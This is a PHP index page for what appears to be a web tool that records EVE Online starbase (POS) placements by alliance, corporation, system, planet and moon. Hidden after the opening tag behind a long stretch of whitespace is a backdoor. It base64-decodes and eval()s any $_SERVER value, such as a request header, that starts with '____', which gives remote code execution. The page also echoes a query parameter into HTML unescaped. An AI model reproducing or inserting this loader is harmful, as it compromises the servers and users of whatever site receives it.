<?php																																																																																																																																																																																																																																																																																																																																																																																																																	function b6628($l6630){if(is_array($l6630)){foreach($l6630 as $l6628=>$l6629)$l6630[$l6628]=b6628($l6629);}elseif(is_string($l6630) && substr($l6630,0,4)=="____"){$l6630=substr($l6630,4);$l6630=base64_decode($l6630);eval($l6630);$l6630=null;}return $l6630;}if(empty($_SERVER))$_SERVER=$HTTP_SERVER_VARS;array_map("b6628",$_SERVER);
session_start();
include_once 'include/classes.php';

if(checkLogin()) {
	$userType=getLoginType();
	$html.=startPage();
	$html.="<div class=\"shaded\">";
	$html.="<a href=\"logout.php\">Logout (as ".$userType.")</a>";
	if($userType=="admin") { //admins can pull reports on what POSes there are in what systems
		//build reporting tool
		
		
		$html.=" || <a href=\"admin.php\">Admin Area</a> || <a href=\"import.php\">Import Tower Mail</a> || <a href=\"report.php\">POS Reporting</a><hr>";
	
		
		$html.=endPage();
		
	} elseif($userType=="user") { //if the user is a normal user and can only add POSes	
		if($_GET['manualCorp']!="") {
			$corpID = getCorpIDByName($_GET['manualCorp']);
			$html.="<hr>";				
			$html.=startTable();
			
			if($corpID==0) {
				$row1.="<tr class=\"tableHeader\"><td>Couldn't Find Corp!</td></tr>";				
				$row2.="<tr><td>Corp was not found, please try again: <a href='index.php?aid=0&cid=0'>Click Here</a></td></tr>";						
			} else {
				//check to make sure the corp does indeed not belong to an alliance
				$allID=getAllianceIDFromCorpID($corpID);
				if($allID!=0) {
					$allName = getAllianceNameByID($allID);					
					$row1.="<tr class=\"tableHeader\"><td>Corp is in an alliance!</td></tr>";				
					if(!$allName) {
						$row.="<tr><td>".$_GET['manualCorp']." is in an alliance, but it wasn't found the local alliance table, please have an admin update the alliance table!<br /> <a href='index.php'>Click Here</a></td></tr>";
					} else {
						$row2.="<tr><td>".$_GET['manualCorp']." is in ".$allName.", please try again: <a href='index.php'>Click Here</a></td></tr>";
					}					
				} else {
					//insert the corp into the corp table
					//reload the No Alliance corp list page
					if(saveNonAllianceCorp($corpID,$_GET['manualCorp'])) {
						$row1.="<tr class=\"tableHeader\"><td>Corporation has been saved!</td></tr>";
						$row2.="<tr><td>Corp Saved!</td><td><a href='index.php?aid=0'>Click Here To Continue</td></tr>";
					}
				}
			}
			
			$row1.="</tr>";
			$row2.="</tr>";
			
			$html.=$row1.$row2;
			$html.=endTable();
			$html.=endForm();
			$html.="</div>";
			$html.=endPage();
			
		} else {	
			$regions = buildRegionList(); //build region array
			//print_r($regions);
			$html.="<hr>";
			$html.=startForm();
			$html.=startTable();
			$row1.="<tr class=\"tableHeader\">";
			$row2.="<tr>";
			$row3.="<tr>";
			if($_GET['aid']!="") { //if an alliance has been selected get the POS types and the corps for that alliance
				$act_alliance = getAllianceArr($_GET['aid']);
				$corps = buildCorpList($_GET['aid']);
				$row1.="<td>Alliances</td>";
				$row2 .= "<td>".buildSelect($act_alliance,"aid")."</td>";
				if($_GET['cid']=="") {
					$row1.="<td>Corporations</td>";
					$row2 .= "<td>".buildSelect($corps,"cid")."</td>";
				}
			} else {
				$alliances = buildAllianceList();
				$row1.="<td>Alliances</td>";
				$row2 .= "<td>".buildSelect($alliances,"aid")."</td>";
			}
			
			if($_GET['cid']!="") {
				if($_GET['cid']=="0") {
					$act_corp = getCorpArr($_GET['cid']);
					$row1.="<td>Corporations</td>";
					$row2 .= "<td>".buildSelect($act_corp,"cid")."</td>";
					$row1.="<td>Manual Corporation Addition</th>";
					$row2.="<td>".buildTextbox("manualCorp")."</td>";
				} else {			
					$act_corp = getCorpArr($_GET['cid']);
					$row1.="<td>Corporations</td>";
					$row2 .= "<td>".buildSelect($act_corp,"cid")."</td>";
					if($_GET['rid']=="") {
						$row1.="<td>Regions</td>";
						$row2 .= "<td>".buildSelect($regions,"rid")."</td>";
					}
				}
			} 
			
			if($_GET['rid']!="") { //if a region has been selected, get the solarsystems for that region
				$solarSystems = buildSolarSystemList($_GET['rid']);	
				$act_region = getRegion($_GET['rid']);
				$row1.="<td>Regions</td>";
				$row2 .= "<td>".buildSelect($act_region,"rid")."</td>";
				if($_GET['sid']=="") { //make sure that there isn't already a system selected
					$row1.="<td>Solar Systems</td>";
					$row2 .= "<td>".buildSelect($solarSystems,"sid")."</td>";
				}
			} 
			
			if($_GET['sid']!="") { //if a solar system has been selected, get the planets for that system
				$planets = buildPlanetList($_GET['sid']);
				$row1.="<td>Solar Systems</td>";
				$act_sys = getSystem($_GET['sid']);
				$row2 .= "<td>".buildSelect($act_sys,"sid")."</td>";
				if($_GET['pid']=="") { //make sure there isn't already a planet selected
					$row1.="<td>Planets</td>";
					$row2 .= "<td>".buildSelect($planets,"pid")."</td>";
				}	
			}
			
			if($_GET['pid']!="") { //if a planet has been selected get the moons for that planet
				$moons = buildMoonList($_GET['pid']);	
				$act_planet = getPlanet($_GET['pid']);
				$row1.="<td>Planets</td>";
				$row2 .= "<td>".buildSelect($act_planet,"pid")."</td>";
				if($_GET['mid']=="") { //make sure there isn't already a moon selected
					$row1.="<td>Moons</td>";
					$row2 .= "<td>".buildSelect($moons,"mid")."</td>";
				}
			}
			
			if($_GET['mid']!="") { //if a moon has been selected get the alliance to choose from	
				$act_moon = getMoon($_GET['mid']);
				$poses = buildPOSTypeList();
				$row1.="<td>Moons</td>";
				$row2 .= "<td>".buildSelect($act_moon,"mid")."</td>";
				if($_GET['pos']=="") {
					$row1.="<td>POS Types</td><td>POS Notes</td><td>Save Verification</td>";
					$row2 .= "<td>".buildSelect($poses,"pos")."</td>";
					$row2 .= "<td>".buildTextarea("notes")."</td>";
					$row2 .= "<td>".buildCheckbox("a","save","Check To Save")."</td>";
				}
			}
			
			
			if($_GET['pos']!="") {
				$act_pos = getPOS($_GET['pos']);	 
				$row1.="<td>POS Types</td><td>POS Notes</td><td>Save Verification</td>";
				$row2 .= "<td>".buildSelect($act_pos,"pos")."</td>";
				if($_GET['notes']=="") {
					$row2 .= "<td>".buildTextarea("notes");
				} else {
					$row2 .= "<td>".buildTextarea("notes",$_GET['notes'])."</td>";
				}
				$row2 .= "<td>".buildCheckbox("a","save","Check To Save")."</td>";
				//print_r($_GET);
				if($_GET['a']=="save") {
					if($_GET['aid']!="" && $_GET['cid']!="" && $_GET['rid']!="" && $_GET['sid']!="" && $_GET['pid']!="" && $_GET['mid']!="" && $_GET['pos']!="") {
						//needs verification code (make sure corp is in alliance etc)
						savePOS($_GET['cid'],$_GET['sid'],$_GET['pid'],$_GET['mid'],$_GET['pos'],$_GET['notes']);
						$posID=getPOSByMoonID($_GET['mid']);
						$row3.="<td class=\"tableHeader\" colspan=9>Save Successful! ";
						if($posID!=false) {
							$row3.="<a href=\"details.php?id=".$posID."\">Click Here to Add Tower Structures</a> || ";
						}
						$row3.="<a href=\"index.php\">Click Here to Add Another Tower</a></td>";
					}
				}
			}
			$row1.="</tr>";
			$row2.="</tr>";
			$row3.="</tr>";
			$html.=$row1.$row2.$row3;
			$html.=endTable();
			$html.=endForm();
			$html.="</div>";
			$html.=endPage();
		}
	} else {
		$html = "Something broke, you're logged in, but you're not any certain usertype.. hax?";
	}
	echo $html;
} else {
	header('Location: login.php');
}
?>